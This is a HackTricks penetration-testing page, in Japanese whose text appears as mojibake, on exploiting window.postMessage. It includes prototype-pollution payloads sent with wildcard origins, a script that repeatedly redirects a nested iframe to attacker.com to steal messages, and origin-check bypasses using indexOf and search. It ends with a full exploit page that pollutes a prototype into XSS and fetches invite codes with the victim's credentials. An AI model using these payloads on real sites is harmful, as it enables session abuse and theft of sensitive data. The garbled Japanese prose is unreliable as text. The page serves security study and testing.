# PostMessage è„†å¼±æ€§

## PostMessage è„†å¼±æ€§

{% hint style="success" %}
AWS ãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„!
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}


## **PostMessage**ã‚’é€ä¿¡

**PostMessage**ã¯ã€ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã«æ¬¡ã®é–¢æ•°ã‚’ä½¿ç”¨ã—ã¾ã™:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€**targetOrigin** ã¯ '\*' ã¾ãŸã¯ _https://company.com_ ã®ã‚ˆã†ãªURLã§ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
**ç¬¬äºŒã®ã‚·ãƒŠãƒªã‚ª**ã§ã¯ã€**ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯ãã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«ã®ã¿é€ä¿¡ã•ã‚Œã‚‹**ï¼ˆã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚ªãƒªã‚¸ãƒ³ãŒç•°ãªã£ã¦ã„ã¦ã‚‚ï¼‰ã€‚\
**ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰**ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯ä»»æ„ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«é€ä¿¡ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Š**ã€ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚ªãƒªã‚¸ãƒ³ã«é€ä¿¡ã•ã‚Œã¾ã™ã€‚

### iframeã®æ”»æ’ƒã¨**targetOrigin**ã®ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰

[**ã“ã®ãƒ¬ãƒãƒ¼ãƒˆ**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€**iframed**ï¼ˆ`X-Frame-Header`ä¿è­·ãªã—ï¼‰ã§ãã‚‹ãƒšãƒ¼ã‚¸ã‚’è¦‹ã¤ã‘ã€**ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰**ï¼ˆ\*ï¼‰ã‚’ä½¿ç”¨ã—ã¦**postMessage**çµŒç”±ã§**æ©Ÿå¯†**ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’**é€ä¿¡ã—ã¦ã„ã‚‹**å ´åˆã€**iframe**ã®**ã‚ªãƒªã‚¸ãƒ³**ã‚’**å¤‰æ›´**ã—ã€ã‚ãªãŸãŒåˆ¶å¾¡ã™ã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³ã«**æ©Ÿå¯†**ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’**æ¼æ´©**ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ãƒšãƒ¼ã‚¸ãŒiframedã§ãã‚‹ãŒã€**targetOrigin**ãŒ**ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã§ã¯ãªãURLã«è¨­å®šã•ã‚Œã¦ã„ã‚‹**å ´åˆã€ã“ã®**ãƒˆãƒªãƒƒã‚¯ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListenerã®æ‚ªç”¨

**`addEventListener`** ã¯ã€JSãŒ**`postMessages`**ã‚’æœŸå¾…ã™ã‚‹é–¢æ•°ã‚’å®£è¨€ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹é–¢æ•°ã§ã™ã€‚\
æ¬¡ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ãŒä½¿ç”¨ã•ã‚Œã¾ã™ï¼š
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
æ³¨æ„ã™ã¹ãã¯ã€**ã‚³ãƒ¼ãƒ‰ãŒæœ€åˆã«è¡Œã†ã“ã¨**ã¯**ã‚ªãƒªã‚¸ãƒ³ã®ç¢ºèª**ã§ã™ã€‚ã“ã‚Œã¯ã€å—ä¿¡ã—ãŸæƒ…å ±ã§**ä½•ã‹æ•æ„Ÿãªã“ã¨**ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å¤‰æ›´ãªã©ï¼‰ã‚’è¡Œã†å ´åˆã«éå¸¸ã«**é‡è¦**ã§ã™ã€‚**ã‚ªãƒªã‚¸ãƒ³ã‚’ç¢ºèªã—ãªã„ã¨ã€æ”»æ’ƒè€…ãŒè¢«å®³è€…ã«ä»»æ„ã®ãƒ‡ãƒ¼ã‚¿ã‚’ã“ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«é€ä¿¡ã•ã›ã€è¢«å®³è€…ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼ˆã“ã®ä¾‹ã§ã¯ï¼‰ã€‚

### åˆ—æŒ™

ç¾åœ¨ã®ãƒšãƒ¼ã‚¸ã§**ã‚¤ãƒ™ãƒ³ãƒˆãƒªã‚¹ãƒŠãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹**ãŸã‚ã«ã€æ¬¡ã®ã“ã¨ãŒã§ãã¾ã™ï¼š

* **JSã‚³ãƒ¼ãƒ‰ã‚’æ¤œç´¢**ã—ã¦`window.addEventListener`ã‚„`$(window).on`ï¼ˆ_JQueryãƒãƒ¼ã‚¸ãƒ§ãƒ³_ï¼‰ã‚’æ¢ã™
* **é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã®ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§å®Ÿè¡Œ**: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* ãƒ–ãƒ©ã‚¦ã‚¶ã®é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã§**_Elements --> Event Listeners_**ã«ç§»å‹•ã™ã‚‹

![](<../../.gitbook/assets/image (396).png>)

* [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta)ã‚„[https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker)ã®ã‚ˆã†ãª**ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½**ã‚’ä½¿ç”¨ã™ã‚‹ã€‚ã“ã®ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½ã¯ã€**ã™ã¹ã¦ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’å‚å—**ã—ã€è¡¨ç¤ºã—ã¾ã™ã€‚

### ã‚ªãƒªã‚¸ãƒ³ãƒã‚§ãƒƒã‚¯ã®ãƒã‚¤ãƒ‘ã‚¹

* **`event.isTrusted`**å±æ€§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ­£å½“ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦ç”Ÿæˆã•ã‚ŒãŸã‚¤ãƒ™ãƒ³ãƒˆã«å¯¾ã—ã¦ã®ã¿`True`ã‚’è¿”ã™ãŸã‚ã€å®‰å…¨ã¨è¦‹ãªã•ã‚Œã¾ã™ã€‚æ­£ã—ãå®Ÿè£…ã•ã‚Œã¦ã„ã‚Œã°ãƒã‚¤ãƒ‘ã‚¹ã¯é›£ã—ã„ã§ã™ãŒã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒã‚§ãƒƒã‚¯ã«ãŠã‘ã‚‹ãã®é‡è¦æ€§ã¯æ³¨ç›®ã«å€¤ã—ã¾ã™ã€‚
* **`indexOf()`**ã‚’ä½¿ç”¨ã—ãŸPostMessageã‚¤ãƒ™ãƒ³ãƒˆã®ã‚ªãƒªã‚¸ãƒ³æ¤œè¨¼ã¯ã€ãƒã‚¤ãƒ‘ã‚¹ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®è„†å¼±æ€§ã‚’ç¤ºã™ä¾‹ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* **`search()`**ãƒ¡ã‚½ãƒƒãƒ‰ã¯`String.prototype.search()`ã‹ã‚‰ã®ã‚‚ã®ã§ã€æ­£è¦è¡¨ç¾ç”¨ã«è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã™ã€‚æ­£è¦è¡¨ç¾ä»¥å¤–ã®ã‚‚ã®ã‚’æ¸¡ã™ã¨ã€æš—é»™çš„ã«æ­£è¦è¡¨ç¾ã«å¤‰æ›ã•ã‚Œã‚‹ãŸã‚ã€ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¯æ½œåœ¨çš„ã«å®‰å…¨ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã“ã‚Œã¯ã€æ­£è¦è¡¨ç¾ã§ã¯ãƒ‰ãƒƒãƒˆï¼ˆ.ï¼‰ãŒãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã¨ã—ã¦æ©Ÿèƒ½ã—ã€ç‰¹åˆ¥ã«ä½œæˆã•ã‚ŒãŸãƒ‰ãƒ¡ã‚¤ãƒ³ã§æ¤œè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã‚‹ãŸã‚ã§ã™ã€‚ä¾‹ãˆã°ï¼š

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* **`match()`**é–¢æ•°ã¯ã€`search()`ã¨åŒæ§˜ã«æ­£è¦è¡¨ç¾ã‚’å‡¦ç†ã—ã¾ã™ã€‚æ­£è¦è¡¨ç¾ãŒä¸é©åˆ‡ã«æ§‹é€ åŒ–ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒã‚¤ãƒ‘ã‚¹ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
* **`escapeHtml`**é–¢æ•°ã¯ã€æ–‡å­—ã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã™ã‚‹ã“ã¨ã§å…¥åŠ›ã‚’ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã™ã‚‹ã“ã¨ã‚’ç›®çš„ã¨ã—ã¦ã„ã¾ã™ã€‚ã—ã‹ã—ã€æ–°ã—ã„ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹ã®ã§ã¯ãªãã€æ—¢å­˜ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ä¸Šæ›¸ãã—ã¾ã™ã€‚ã“ã®å‹•ä½œã¯æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ç‰¹ã«ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒæ“ä½œã•ã‚Œã€ãã®åˆ¶å¾¡ã•ã‚ŒãŸãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒ`hasOwnProperty`ã‚’èªè­˜ã—ãªã„å ´åˆã€`escapeHtml`ã¯æœŸå¾…é€šã‚Šã«æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚ä»¥ä¸‹ã®ä¾‹ã§ç¤ºã•ã‚Œã¦ã„ã¾ã™ï¼š

* æœŸå¾…ã•ã‚Œã‚‹å¤±æ•—ï¼š

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
* ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã‚’ãƒã‚¤ãƒ‘ã‚¹ï¼š

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

ã“ã®è„†å¼±æ€§ã®æ–‡è„ˆã«ãŠã„ã¦ã€`File`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ãã®èª­ã¿å–ã‚Šå°‚ç”¨ã®`name`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®ãŸã‚ã«ç‰¹ã«æ‚ªç”¨ã•ã‚Œã‚„ã™ã„ã§ã™ã€‚ã“ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§ä½¿ç”¨ã•ã‚Œã‚‹ã¨ãã€`escapeHtml`é–¢æ•°ã«ã‚ˆã£ã¦ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œãšã€æ½œåœ¨çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã‚’å¼•ãèµ·ã“ã—ã¾ã™ã€‚
* JavaScriptã®`document.domain`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã«ã‚ˆã£ã¦ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’çŸ­ç¸®ã™ã‚‹ãŸã‚ã«è¨­å®šã§ãã€åŒã˜è¦ªãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã§ã®åŒä¸€ã‚ªãƒªã‚¸ãƒ³ãƒãƒªã‚·ãƒ¼ã®é©ç”¨ã‚’ç·©å’Œã—ã¾ã™ã€‚

### e.origin == window.originã®ãƒã‚¤ãƒ‘ã‚¹

%%%%%%ã‚’ä½¿ç”¨ã—ã¦**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åŒ–ã•ã‚ŒãŸiframe**å†…ã«ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’åŸ‹ã‚è¾¼ã‚€éš›ã€iframeã®ã‚ªãƒªã‚¸ãƒ³ã¯nullã«è¨­å®šã•ã‚Œã‚‹ã“ã¨ã‚’ç†è§£ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚ã“ã‚Œã¯ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å±æ€§**ã¨ãã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãŠã‚ˆã³æ©Ÿèƒ½ã¸ã®å½±éŸ¿ã‚’æ‰±ã†éš›ã«ç‰¹ã«é‡è¦ã§ã™ã€‚

ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å±æ€§ã«**`allow-popups`**ã‚’æŒ‡å®šã™ã‚‹ã¨ã€iframeå†…ã‹ã‚‰é–‹ã‹ã‚ŒãŸãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã¯è¦ªã®ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åˆ¶é™ã‚’ç¶™æ‰¿ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€**`allow-popups-to-escape-sandbox`**å±æ€§ã‚‚å«ã¾ã‚Œã¦ã„ãªã„é™ã‚Šã€ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã®ã‚ªãƒªã‚¸ãƒ³ã‚‚åŒæ§˜ã«`null`ã«è¨­å®šã•ã‚Œã€iframeã®ã‚ªãƒªã‚¸ãƒ³ã¨ä¸€è‡´ã™ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã“ã‚Œã‚‰ã®æ¡ä»¶ä¸‹ã§ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ãŒé–‹ã‹ã‚Œã€iframeã‹ã‚‰ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã«**`postMessage`**ã‚’ä½¿ç”¨ã—ã¦ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒé€ä¿¡ã•ã‚Œã‚‹ã¨ã€é€ä¿¡å´ã¨å—ä¿¡å´ã®ä¸¡æ–¹ã®ã‚ªãƒªã‚¸ãƒ³ãŒ`null`ã«è¨­å®šã•ã‚Œã¾ã™ã€‚ã“ã®çŠ¶æ³ã¯ã€**`e.origin == window.origin`**ãŒçœŸï¼ˆ`null == null`ï¼‰ã¨è©•ä¾¡ã•ã‚Œã‚‹ã‚·ãƒŠãƒªã‚ªã‚’å¼•ãèµ·ã“ã—ã¾ã™ã€‚ãªãœãªã‚‰ã€iframeã¨ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã¯åŒã˜ã‚ªãƒªã‚¸ãƒ³å€¤`null`ã‚’å…±æœ‰ã—ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯**èª­ã‚€**ï¼š

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.sourceã®ãƒã‚¤ãƒ‘ã‚¹

ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒãƒªã‚¹ãƒ‹ãƒ³ã‚°ã—ã¦ã„ã‚‹åŒã˜ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‹ã‚‰æ¥ãŸã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼ˆç‰¹ã«**ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**ãŒãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒåŒã˜ãƒšãƒ¼ã‚¸ã‹ã‚‰é€ä¿¡ã•ã‚ŒãŸã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã®ã«èˆˆå‘³æ·±ã„ã§ã™ï¼‰ï¼š
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã® **`e.source`** ã‚’ null ã«ã™ã‚‹ã«ã¯ã€**postMessage** ã‚’ **é€ä¿¡** ã—ã€**ã™ãã«å‰Šé™¤ã•ã‚Œã‚‹** **iframe** ã‚’ä½œæˆã—ã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€**èª­ã‚“ã§ãã ã•ã„:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header ãƒã‚¤ãƒ‘ã‚¹

ã“ã‚Œã‚‰ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€ç†æƒ³çš„ã«ã¯ **è¢«å®³è€…ã®ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸** ã‚’ `iframe` å†…ã«é…ç½®ã§ãã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã—ã‹ã—ã€`X-Frame-Header` ã®ã‚ˆã†ãªãƒ˜ãƒƒãƒ€ãƒ¼ã¯ã€ãã® **å‹•ä½œ** ã‚’ **é˜²ã** ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚\
ãã®ã‚ˆã†ãªã‚·ãƒŠãƒªã‚ªã§ã¯ã€ã‚ã¾ã‚Šã‚¹ãƒ†ãƒ«ã‚¹æ€§ã®ãªã„æ”»æ’ƒã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è„†å¼±ãªã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ–°ã—ã„ã‚¿ãƒ–ã§é–‹ãã€ãã‚Œã¨é€šä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### å­ãƒšãƒ¼ã‚¸ã«é€ä¿¡ã•ã‚ŒãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ãƒ¡ã‚¤ãƒ³ãƒšãƒ¼ã‚¸ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã—ã¦ç›—ã‚€

ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã™ã‚‹å‰ã«**ãƒ¡ã‚¤ãƒ³**ãƒšãƒ¼ã‚¸ã‚’**ãƒ–ãƒ­ãƒƒã‚¯**ã—ã€**å­**ã§**XSS**ã‚’æ‚ªç”¨ã—ã¦**ãƒ‡ãƒ¼ã‚¿ã‚’æ¼æ´©**ã•ã›ã‚‹ã“ã¨ã§ã€**å­iframe**ã«é€ä¿¡ã•ã‚ŒãŸ**æ©Ÿå¯†ã®postmessageãƒ‡ãƒ¼ã‚¿**ã‚’ã©ã®ã‚ˆã†ã«ç›—ã‚€ã“ã¨ãŒã§ãã‚‹ã‹ã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframeã®ä½ç½®ã‚’å¤‰æ›´ã—ã¦ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ç›—ã‚€

X-Frame-HeaderãŒãªã„ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’iframeã§ãã‚‹å ´åˆã€åˆ¥ã®iframeã‚’å«ã‚€å ´åˆã€**ãã®å­iframeã®ä½ç½®ã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚‚ã—ãã‚ŒãŒ**ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰**ã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã•ã‚ŒãŸ**postmessage**ã‚’å—ä¿¡ã—ã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ãã®iframeã®**ã‚ªãƒªã‚¸ãƒ³**ã‚’å½¼ãŒ**åˆ¶å¾¡**ã™ã‚‹ãƒšãƒ¼ã‚¸ã«**å¤‰æ›´**ã—ã€ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’**ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessageã«ã‚ˆã‚‹ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ãŠã‚ˆã³/ã¾ãŸã¯XSS

`postMessage`ã‚’é€šã˜ã¦é€ä¿¡ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ãŒJSã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹ã‚·ãƒŠãƒªã‚ªã§ã¯ã€**ãƒšãƒ¼ã‚¸**ã‚’**iframe**ã—ã€`postMessage`ã‚’ä»‹ã—ã¦ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§**ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“/XSS**ã‚’**æ‚ªç”¨**ã§ãã¾ã™ã€‚

**postMessage**ã‚’é€šã˜ã¦ã®**éå¸¸ã«è‰¯ãèª¬æ˜ã•ã‚ŒãŸXSS**ã®ã„ãã¤ã‹ã¯ã€[https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

`iframe`ã¸ã®`postMessage`ã‚’é€šã˜ã¦**ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’æ‚ªç”¨ã—ã€ãã®å¾ŒXSS**ã‚’è¡Œã†ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®ä¾‹ï¼š
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
For **more information**:

* Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/)
* Link to page about [**XSS**](../xss-cross-site-scripting/)
* Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## References

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* To practice: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
